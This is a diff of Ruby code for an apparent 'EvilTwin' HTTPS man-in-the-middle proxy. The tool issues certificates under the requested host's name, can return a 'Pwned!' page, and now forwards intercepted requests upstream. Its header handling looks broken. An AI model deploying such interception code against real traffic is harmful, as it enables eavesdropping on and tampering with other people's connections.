@@ -106,8 +106,8 @@ class Doppelganger
 				:SSLCertName => [['C', 'US'], ['O', host], ['CN', host], ['OU', rand(65535).to_s]],
 				:DocumentRoot => "/tmp")
 		
-		#@Server.mount("/", DoppelgangerCGI)
-		@Server.mount("/", HTTPServlet::CGIHandler, "./fetch_ssl.rb")
+		@Server.mount("/", DoppelgangerCGI)
+		#@Server.mount("/", WEBrick::HTTPServlet::CGIHandler, "./fetch_ssl.rb")
 
 		puts "Starting EvilTwin Proxy server: " + host
 		trap("INT") { |sig|
@@ -475,7 +475,7 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 		
 			$body = "Pwned!"
      	 }
-    	}
+   	}
 
 	#pp $body
 
@@ -484,10 +484,31 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 	response['Content-Type'] = type
 	response.body = body
 		
-  	end
+  end
 	
 	def process_request (request)
-		return "200", "text/plain", "Datad!"
+		uri = URI.parse(request.request_uri.to_s)
+
+		response = []
+
+		header = {}
+    request.raw_header.each {|line| 
+			key, item = line.split(":") 
+		}
+
+		#request.header.each { |key| header[key] = request.header[key][0] }
+
+		#pp header
+
+		http = Net::HTTP.new(uri.host, uri.port)
+   	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
+    	http.start {
+      	http.request_get(uri.path, header) {|res|
+					response << res['content-type']
+					response << res.body
+     	 }
+    	}
+		return "200", response[0], response[1]
 	end
 
 	def do_POST(request, response)
